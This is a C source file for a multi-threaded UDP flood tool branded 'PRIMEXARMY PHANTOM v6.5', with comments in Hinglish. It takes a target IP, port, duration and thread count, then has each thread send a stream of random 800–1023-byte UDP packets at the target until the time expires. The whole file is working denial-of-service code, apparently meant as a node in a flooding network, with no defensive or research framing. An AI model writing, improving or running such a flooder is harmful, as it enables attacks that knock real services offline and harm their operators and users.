#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    // ✨ FIX: Har thread apni alag copy banayega heap se
    struct thread_data *data = (struct thread_data *)arg;
    char target_ip[16];
    int target_port = data->port;
    int target_duration = data->duration;
    
    strcpy(target_ip, data->ip);
    free(arg); // Memory free karo jo main() ne allocate ki thi

    int sock;
    struct sockaddr_in server_addr;
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    fcntl(sock, F_SETFL, O_NONBLOCK);
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    char payload[1024];
    time_t end_time = time(NULL) + target_duration;
    
    while (time(NULL) < end_time) {
        for (int i = 0; i < 1024; i++) payload[i] = (char)(rand() % 255);
        for (int i = 0; i < 80; i++) { // Optimization for Matrix load
            int packet_size = 800 + (rand() % 224);
            sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
        usleep(5); 
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // Order check: ip(1) port(2) time(3) threads(4) -> Exact YAML Match
    if (argc != 5) {
        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗣𝗛𝗔𝗡𝗧𝗢𝗠 𝘃𝟲.𝟱  ⚔️\n");
        printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
        return 1;
    }

    int threads_count = atoi(argv[4]);
    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));
    srand(time(NULL));

    printf("🚀 [MATRIX NODE ACTIVE] Target: %s:%s | Threads: %d\n", argv[1], argv[2], threads_count);

    for (int i = 0; i < threads_count; i++) {
        // ✨ CRITICAL FIX: Har thread ke liye alag memory allocate karna zaroori hai
        struct thread_data *t_data = malloc(sizeof(struct thread_data));
        strncpy(t_data->ip, argv[1], 15);
        t_data->ip[15] = '\0';
        t_data->port = atoi(argv[2]);
        t_data->duration = atoi(argv[3]);
        
        pthread_create(&thread_id[i], NULL, prime_strike, (void *)t_data);
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(thread_id[i], NULL);
    }

    free(thread_id);
    printf("✅ [FINISHED] Node Strike Complete.\n");
    return 0;
}
